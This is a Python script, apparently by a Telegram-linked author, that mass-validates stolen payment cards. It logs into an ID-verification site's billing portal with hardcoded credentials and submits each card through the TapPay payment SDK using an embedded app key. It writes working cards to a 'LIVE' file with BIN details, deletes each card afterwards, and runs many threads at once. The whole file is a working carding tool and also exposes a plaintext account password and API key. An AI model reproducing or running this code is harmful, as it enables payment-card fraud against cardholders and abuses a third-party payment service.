import requests
import random
import string
import json
import time
import colorama
from colorama import Fore, Style
import zlib
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import tkinter as tk
from tkinter import filedialog
from datetime import datetime, timedelta
import subprocess
import signal

# Khởi tạo các biến global
colorama.init(autoreset=True)
stop_flag = threading.Event()
processed_cards = set()
processed_cards_lock = threading.Lock()

# Biến theo dõi thống kê
stats = {
    'total_cards': 0,
    'processed_cards': 0,
    'live_count': 0,
    'die_count': 0,
    'start_time': None,
    'stats_lock': threading.Lock(),
    'active_threads': 0,
    'max_threads': 0
}

cards = []

def generate_random_string(pattern):
    # Hàm tạo chuỗi ngẫu nhiên theo pattern
    result = ""
    for char in pattern:
        if char == 'u': result += random.choice(string.ascii_uppercase)
        elif char == 'l': result += random.choice(string.ascii_lowercase)
        elif char == 'd': result += random.choice(string.digits)
        else: result += char
    return result

def check_bin(card_number):
    # Kiểm tra thông tin BIN của thẻ
    try:
        bin_number = card_number[:6]
        response = requests.get(f'https://data.handyapi.com/bin/{bin_number}', 
                              headers={'Referer': 'your-domain'})
        
        if response.status_code == 200:
            data = response.json()
            if data.get('Status') == 'SUCCESS':
                return {
                    'type': data.get('Type', 'UNKNOWN'),
                    'issuer': data.get('Issuer', 'UNKNOWN'),
                    'tier': data.get('CardTier', 'UNKNOWN'),
                    'country': data.get('Country', {}).get('Name', 'UNKNOWN')
                }
        return None
    except Exception as e:
        print(Fore.RED + f"Lỗi khi check BIN: {str(e)}" + Style.RESET_ALL)
        return None

def check_card(card_info):
    # Kiểm tra tính hợp lệ của thẻ
    if stop_flag.is_set():
        return
    
    card_string = f"{card_info['number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"

    try:
        # Thiết lập headers cơ bản
        base_headers = {
            "scheme": "https",
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9,vi;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://portal2.idanalyzer.com",
            "priority": "u=1, i",
            "referer": "https://portal2.idanalyzer.com/",
            "sec-ch-ua": "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        }

        # Khởi tạo session và đăng nhập
        session = requests.Session()
        
        login_data = {
            "action": "login",
            "email": "yobincoesparanza@gmail.com",
            "password": "MrDat@037",
            "accesscode": "",
            "remember": "0"
        }
        
        login_response = session.post(
            "https://portal.idanalyzer.com/cmd_v2.php",
            data=login_data,
            headers=base_headers
        )

        cookies = session.cookies.get_dict()  # Lấy cookies từ session
        base_headers['cookie'] = f"PHPSESSID={cookies.get('PHPSESSID', '')}; IDF_USER_TOKEN={cookies.get('IDF_USER_TOKEN', '')}"

        account_response = session.get(
            "https://api2.idanalyzer.com/myaccount",
            headers=base_headers
        )

        card_list_response = session.post(
            "https://portal.idanalyzer.com/cmd_v2.php",
            data={"action": "getcardlist"},
            headers=base_headers
        )

        device_id = "VW01xDe9V6UziTUXKLFYKe7jkTNle2RMsPzL_bdAr1_e1AQAAABkuClEoYCMQM25"
        random_mail = generate_random_string("llllllllllllllddddll")  # Tạo email ngẫu nhiên
        random_name = generate_random_string("Ulll Ulll")  # Tạo tên ngẫu nhiên

        tappay_headers = {
            **base_headers,
            "accept": "*/*",
            "origin": "https://js.tappaysdk.com",
            "referer": "https://js.tappaysdk.com/sdk/tpdirect/api/html/v5.15.0?{\"appKey\":\"app_Yup1WClGIVLuB9XNA1oWgyGXp3PZt3Bcs0NVXWrTq2GcO4VIMsXGVZHm4QAr\",\"appID\":12285,\"serverType\":\"production\",\"hostname\":\"portal2.idanalyzer.com\",\"origin\":\"https://portal2.idanalyzer.com\",\"referrer\":\"https://portal2.idanalyzer.com/dashboard\",\"href\":\"https://portal2.idanalyzer.com/billing\",\"port\":\"\",\"protocol\":\"https:\",\"sdk_version\":\"v5.15.0\",\"mode\":\"production\"}",
            "x-api-key": "app_Yup1WClGIVLuB9XNA1oWgyGXp3PZt3Bcs0NVXWrTq2GcO4VIMsXGVZHm4QAr"
        }

        tappay_data = {
            "cardnumber": card_info['number'],
            "cardduedate": f"{card_info['year']}{card_info['month']}",
            "appid": 12285,
            "appkey": "app_Yup1WClGIVLuB9XNA1oWgyGXp3PZt3Bcs0NVXWrTq2GcO4VIMsXGVZHm4QAr",
            "appname": "portal2.idanalyzer.com",
            "url": "https://portal2.idanalyzer.com",
            "port": "",
            "protocol": "https:",
            "tappay_sdk_version": "v5.15.0",
            "cardccv": card_info['cvv'],
            "device_id": device_id
        }

        prime_response = session.post(
            "https://js.tappaysdk.com/payment/tpdirect/production/getprime",
            data={"jsonString": json.dumps(tappay_data)},
            headers=tappay_headers
        )

        # Xử lý kết quả check card
        if prime_response.ok:
            try:
                prime_data = prime_response.json()
                prime = prime_data.get("card", {}).get("prime")
                if not prime:
                    print(Fore.YELLOW + f"No prime found in response: {prime_data}" + Style.RESET_ALL)
                    return
            except json.JSONDecodeError as e:
                print(Fore.RED + f"Failed to decode prime response: {e}" + Style.RESET_ALL)
                print(Fore.RED + f"Response content: {prime_response.text}" + Style.RESET_ALL)
                return

            cardholder_name = generate_random_string("Ulll Ulll")  # Tạo tên chủ thẻ ngẫu nhiên
            email = "yobincoesparanza@gmail.com"

            save_card_data = {
                "action": "savecard",
                "prime": prime,
                "name": cardholder_name,
                "email": email,
                "mobile": "(907) 868-1465"
            }

            save_card_headers = {
                "scheme": "https",
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": f"PHPSESSID={session.cookies.get('PHPSESSID', '')}; IDF_USER_TOKEN={session.cookies.get('IDF_USER_TOKEN', '')}",
                "origin": "https://portal2.idanalyzer.com",
                "referer": "https://portal2.idanalyzer.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
            }

            try:
                save_response = session.post("https://portal.idanalyzer.com/cmd_v2.php", data=save_card_data, headers=save_card_headers)

                if save_response.status_code == 200:
                    try:
                        if not save_response.text:
                            print(Fore.RED + "Empty response received" + Style.RESET_ALL)
                            return False

                        response_json = save_response.json()
                        if response_json.get("success"):
                            # Thẻ LIVE
                            with stats['stats_lock']:
                                stats['live_count'] += 1
                                stats['processed_cards'] += 1
                            
                            # Check thông tin BIN và lưu kết quả
                            bin_info = check_bin(card_info['number'])
                            if bin_info:
                                card_string_with_info = f"{card_string}|{bin_info['type']}|{bin_info['issuer']}|{bin_info['tier']}|{bin_info['country']}"
                                with open('live.txt', 'a') as live_file:
                                    live_file.write(f"LIVE|{card_string_with_info}\n")
                            else:
                                with open('live.txt', 'a') as live_file:
                                    live_file.write(f"LIVE|{card_string}\n")

                            # Xóa thẻ sau khi check thành công
                            try:
                                print(Fore.YELLOW + "Starting card deletion process..." + Style.RESET_ALL)
                                
                                card_list_response = session.post(
                                    "https://portal.idanalyzer.com/cmd_v2.php",
                                    data={"action": "getcardlist"},
                                    headers=base_headers
                                )

                                if card_list_response.status_code == 200:
                                    card_list_json = card_list_response.json()
                                    if card_list_json.get('success') and isinstance(card_list_json.get('result'), list):
                                        cards_data = card_list_json['result']
                                        print(Fore.YELLOW + f"Found {len(cards_data)} cards to delete" + Style.RESET_ALL)
                                        
                                        for card in cards_data:
                                            card_id = card.get('id')
                                            if card_id:
                                                delete_response = session.post(
                                                    "https://portal.idanalyzer.com/cmd_v2.php",
                                                    data={
                                                        "action": "deletecard",
                                                        "id": card_id
                                                    },
                                                    headers=base_headers
                                                )
                                                
                                                if delete_response.status_code == 200:
                                                    try:
                                                        delete_result = delete_response.json()
                                                        if delete_result.get('success'):
                                                            print(Fore.GREEN + f"Card deleted successfully: ID {card_id}" + Style.RESET_ALL)
                                                        else:
                                                            print(Fore.RED + f"Failed to delete card: ID {card_id}" + Style.RESET_ALL)
                                                    except:
                                                        print(Fore.RED + f"Failed to parse delete response for card: ID {card_id}" + Style.RESET_ALL)
                                                else:
                                                    print(Fore.RED + f"Failed to delete card: ID {card_id} - Status: {delete_response.status_code}" + Style.RESET_ALL)
                                    else:
                                        print(Fore.RED + "Invalid card list response format" + Style.RESET_ALL)
                                else:
                                    print(Fore.RED + f"Failed to get card list - Status: {card_list_response.status_code}" + Style.RESET_ALL)
                                    
                            except Exception as e:
                                print(Fore.RED + f"Error in deletion process: {str(e)}" + Style.RESET_ALL)
                        else:
                            # Thẻ DIE
                            with stats['stats_lock']:
                                stats['die_count'] += 1
                                stats['processed_cards'] += 1
                            print(Fore.RED + f"Card check failed: {card_info['number']} (DIE) | Live: {stats['live_count']} | Die: {stats['die_count']}" + Style.RESET_ALL)
                            with open('die.txt', 'a') as die_file:
                                die_file.write(f"{card_string}\n")
                    except json.JSONDecodeError as e:
                        print(Fore.RED + f"Failed to decode response" + Style.RESET_ALL)
                        return False
                else:
                    print(Fore.RED + f"Request failed with status code: {save_response.status_code} for card {card_info['number']}" + Style.RESET_ALL)
                    return False

            except Exception as e:
                print(f"Unexpected error: {e}")
                with stats['stats_lock']:
                    stats['processed_cards'] += 1
                return False

        with processed_cards_lock:
            processed_cards.add(card_string)  # Thêm thẻ vào danh sách đã xử lý
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        with stats['stats_lock']:
            stats['processed_cards'] += 1
        return False

def parse_card_line(line):
    try:
        line = line.strip()
        parts = line.split('|')
        if len(parts) != 4:
            print(f"Invalid card format: {line}")
            return None
            
        return {
            'number': parts[0],
            'month': parts[1],
            'year': parts[2],
            'cvv': parts[3]
        }
    except Exception as e:
        print(f"Error processing card line: {line}")
        print(f"Error: {str(e)}")
        return None

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')  # Xóa màn hình console

def get_user_input(prompt):
    layout = [[sg.Text(prompt)],
              [sg.InputText()],
              [sg.Button('OK'), sg.Button('Cancel')]]

    window = sg.Window('Input', layout)

    event, values = window.read()
    window.close()

    if event == 'OK':
        return values[0]  # Trả về giá trị nhập vào
    else:
        return None  # Nếu nhấn Cancel

def save_remaining_cards(original_cards):
    original_set = set(card.strip() for card in original_cards)  # Chuyển danh sách thẻ gốc thành set để dễ so sánh
    remaining_cards = original_set - processed_cards  # Tìm các thẻ chưa được xử lý
    
    if remaining_cards:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        result_folder = f'result_{timestamp}'
        if not os.path.exists(result_folder):
            os.makedirs(result_folder)  # Tạo thư mục kết quả nếu chưa tồn tại
            
        remain_file = f'{result_folder}/remaincard.txt'
        with open(remain_file, 'w') as f:
            for card in remaining_cards:
                f.write(f"{card}\n")  # Lưu các thẻ còn lại vào file
        
        print(Fore.YELLOW + f"\nĐã lưu {len(remaining_cards)} thẻ chưa check vào {remain_file}" + Style.RESET_ALL)

def update_console():
    while not stop_flag.is_set():
        if stats['start_time']:
            elapsed_time = datetime.now() - stats['start_time']
            remaining_cards = stats['total_cards'] - stats['processed_cards']
            
            minutes_elapsed = elapsed_time.total_seconds() / 60
            speed = stats['processed_cards'] / minutes_elapsed if minutes_elapsed > 0 else 0
            remaining_time = timedelta(minutes=(remaining_cards / speed)) if speed > 0 else timedelta()
            
            os.system('cls' if os.name == 'nt' else 'clear')
            
            box_width = 64
            title = "STATISTICS CHECKER | Author: @toansx"
            padding = (box_width - 2 - len(title)) // 2
            title_line = f"{' ' * padding}{title}{' ' * (box_width - 2 - len(title) - padding)}"
            
            active_threads_str = f"{stats['active_threads']}/{stats['max_threads']}"
            
            stats_box = [
                f"{Fore.CYAN}╔{'═' * (box_width-2)}╗{Style.RESET_ALL}",
                f"{Fore.CYAN}║{Fore.YELLOW + Style.BRIGHT}{title_line}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}╠{'═' * (box_width-2)}╣{Style.RESET_ALL}",
                f"{Fore.CYAN}║{' ' * (box_width-2)}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Total Cards':<15}{Fore.CYAN}: {Fore.WHITE}{str(stats['total_cards']):<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Processed':<15}{Fore.CYAN}: {Fore.WHITE}{str(stats['processed_cards']):<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Remaining':<15}{Fore.CYAN}: {Fore.WHITE}{str(remaining_cards):<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Live Cards':<15}{Fore.CYAN}: {Fore.GREEN + Style.BRIGHT}{str(stats['live_count']):<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Die Cards':<15}{Fore.CYAN}: {Fore.RED + Style.BRIGHT}{str(stats['die_count']):<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Speed':<15}{Fore.CYAN}: {Fore.MAGENTA}{f'{speed:.2f} cards/min':<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Elapsed Time':<15}{Fore.CYAN}: {Fore.YELLOW}{str(elapsed_time).split('.')[0]:<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Remaining Time':<15}{Fore.CYAN}: {Fore.YELLOW}{str(remaining_time).split('.')[0]:<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║  {Fore.WHITE + Style.BRIGHT}{'Active Threads':<15}{Fore.CYAN}: {Fore.MAGENTA}{active_threads_str:<{box_width-21}}{Fore.CYAN}║{Style.RESET_ALL}",
                f"{Fore.CYAN}║{' ' * (box_width-2)}║{Style.RESET_ALL}",
                f"{Fore.CYAN}╚{'═' * (box_width-2)}╝{Style.RESET_ALL}"
            ]
            
            terminal_width = os.get_terminal_size().columns
            print('\n')
            for line in stats_box:
                padding = (terminal_width - box_width) // 2
                print(' ' * padding + line)
            print('\n')
                    
        time.sleep(1)

def save_results_on_stop():
    global cards
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
    result_folder = f'result_{timestamp}'
    
    try:
        if not os.path.exists(result_folder):
            os.makedirs(result_folder)  # Tạo thư mục kết quả nếu chưa tồn tại
        
        if os.path.exists('live.txt'):
            os.rename('live.txt', f'{result_folder}/live.txt')  # Di chuyển file live.txt vào thư mục kết quả
            print(Fore.GREEN + f"\nĐã lưu thẻ live vào {result_folder}/live.txt" + Style.RESET_ALL)
            
        if os.path.exists('die.txt'):
            os.rename('die.txt', f'{result_folder}/die.txt')  # Di chuyển file die.txt vào thư mục kết quả
            print(Fore.RED + f"Đã lưu thẻ die vào {result_folder}/die.txt" + Style.RESET_ALL)
        
        if cards:
            original_set = set(card.strip() for card in cards)  # Chuyển danh sách thẻ gốc thành set để dễ so sánh
            remaining_cards = original_set - processed_cards  # Tìm các thẻ chưa được xử lý
            
            if remaining_cards:
                with open(f'{result_folder}/remaincard.txt', 'w') as f:
                    for card in remaining_cards:
                        f.write(f"{card}\n")  # Lưu các thẻ còn lại vào file
                print(Fore.YELLOW + f"Đã lưu {len(remaining_cards)} thẻ chưa check vào {result_folder}/remaincard.txt" + Style.RESET_ALL)
                
                with open(f'{result_folder}/statistics.txt', 'w') as f:
                    f.write(f"Total Cards: {stats['total_cards']}\n")
                    f.write(f"Processed: {stats['processed_cards']}\n")
                    f.write(f"Live Cards: {stats['live_count']}\n")
                    f.write(f"Die Cards: {stats['die_count']}\n")
                    f.write(f"Remaining Cards: {len(remaining_cards)}\n")
                    if stats['start_time']:
                        elapsed_time = datetime.now() - stats['start_time']
                        f.write(f"Total Time: {str(elapsed_time).split('.')[0]}\n")
        
        print(Fore.CYAN + f"\nĐã lưu tất cả kết quả vào thư mục: {result_folder}" + Style.RESET_ALL)
        
        subprocess.Popen(f'explorer {result_folder}' if os.name == 'nt' else f'xdg-open {result_folder}', shell=True)
        
    except Exception as e:
        print(Fore.RED + f"\nLỗi khi lưu kết quả: {str(e)}" + Style.RESET_ALL)

def signal_handler(signum, frame):
    print(Fore.YELLOW + "\n\nĐang dừng tool..." + Style.RESET_ALL)
    stop_flag.set()  # Đặt cờ dừng
    
    time.sleep(2)  # Đợi một chút để các threads hiện tại kết thúc
    
    save_results_on_stop()  # Lưu kết quả khi dừng tool
    
    print(Fore.GREEN + "\nĐã dừng tool thành công!" + Style.RESET_ALL)
    sys.exit(0)

def main():
    # Khởi tạo chương trình
    signal.signal(signal.SIGINT, signal_handler)
    clear_console()
    
    # Hiển thị banner và thông tin
    print(Fore.BLUE + "... banner ..." + Style.RESET_ALL)
    print(Fore.MAGENTA + "By:Nguyen Toan (Telegram: @toansx)" + Style.RESET_ALL)
    
    # Chọn file input
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(
        title="Chọn file .txt chứa danh sách thẻ",
        filetypes=[("Text files", "*.txt")]
    )

    if not file_path:
        print(Fore.RED + "Không có file nào được chọn." + Style.RESET_ALL)
        return

    try:
        with open(file_path, 'r') as file:
            cards = file.readlines()  # Đọc danh sách thẻ từ file
        
        unique_cards = list(set(cards))  # Lọc bỏ thẻ trùng lặp
        
        total_cards = len(unique_cards)
        print(Fore.CYAN + f"Found {total_cards} unique cards" + Style.RESET_ALL)

        num_threads = int(input("Nhập số lượng luồng (threads) bạn muốn sử dụng: "))  # Nhập số lượng luồng
        stats['max_threads'] = num_threads
        print(Fore.CYAN + f"Sẽ sử dụng {num_threads} luồng." + Style.RESET_ALL)

        stats['total_cards'] = len(unique_cards)
        stats['start_time'] = datetime.now()  # Ghi lại thời gian bắt đầu

        stats_thread = threading.Thread(target=update_console, daemon=True)  # Tạo thread để cập nhật console
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            stats['active_threads'] = num_threads
            futures = []

            for card_line in unique_cards:
                if stop_flag.is_set():
                    break
                card_info = parse_card_line(card_line)  # Phân tích thông tin thẻ
                if card_info:
                    future = executor.submit(check_card, card_info)  # Gửi thẻ để kiểm tra
                    futures.append(future)

            for future in futures:
                future.result()  # Chờ tất cả các luồng hoàn thành

        stop_flag.set()  # Đặt cờ dừng
        stats_thread.join()  # Chờ thread thống kê hoàn thành

        print(Fore.GREEN + "All cards processed successfully." + Style.RESET_ALL)

        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        result_folder = f'result_{timestamp}'
        if not os.path.exists(result_folder):
            os.makedirs(result_folder)  # Tạo thư mục kết quả nếu chưa tồn tại

        if os.path.exists('live.txt'):
            os.rename('live.txt', f'{result_folder}/live.txt')  # Di chuyển file live.txt vào thư mục kết quả
        if os.path.exists('die.txt'):
            os.rename('die.txt', f'{result_folder}/die.txt')  # Di chuyển file die.txt vào thư mục kết quả

        print(Fore.CYAN + "Press ENTER to open folder result..." + Style.RESET_ALL)
        input()  # Chờ người dùng nhấn ENTER

        subprocess.Popen(f'explorer {result_folder}' if os.name == 'nt' else f'xdg-open {result_folder}', shell=True)

    except FileNotFoundError:
        print(Fore.RED + "cards.txt not found" + Style.RESET_ALL)
    except ValueError:
        print(Fore.RED + "Vui lòng nhập một số nguyên hợp lệ cho số lượng luồng." + Style.RESET_ALL)
    except Exception as e:
        stop_flag.set()  # Đảm bảo dừng thread thống kê nếu có lỗi
        print(Fore.RED + f"Error occurred: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()